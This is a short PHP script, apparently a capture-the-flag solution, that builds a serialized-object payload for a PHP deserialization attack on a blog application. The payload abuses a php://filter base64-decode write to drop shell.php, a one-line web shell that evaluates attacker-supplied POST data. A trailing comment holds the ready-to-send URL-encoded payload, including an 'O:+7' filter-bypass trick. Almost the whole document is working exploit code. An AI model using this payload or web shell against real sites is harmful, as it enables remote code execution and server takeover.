<?php
class BlogLog {
  public $log_ = 'php://filter/write=convert.base64-decode/resource=./shell.php';
  public $content = 'PD9waHAgZXZhbCgkX1BPU1RbOTk5OTk5XSk7Pz4=';  
}
$temp = new BlogLog;
$result = array('a' => 'test', $temp);
echo urlencode(serialize($result));
/*
a%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A4%3A%22test%22%3Bi%3A0%3BO%3A%2B7%3A%22BlogLog%22%3A2%3A%7Bs%3A4%3A%22log_%22%3Bs%3A61%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D.%2Fshell.php%22%3Bs%3A7%3A%22content%22%3Bs%3A40%3A%22PD9waHAgZXZhbCgkX1BPU1RbOTk5OTk5XSk7Pz4%3D%22%3B%7D%7D
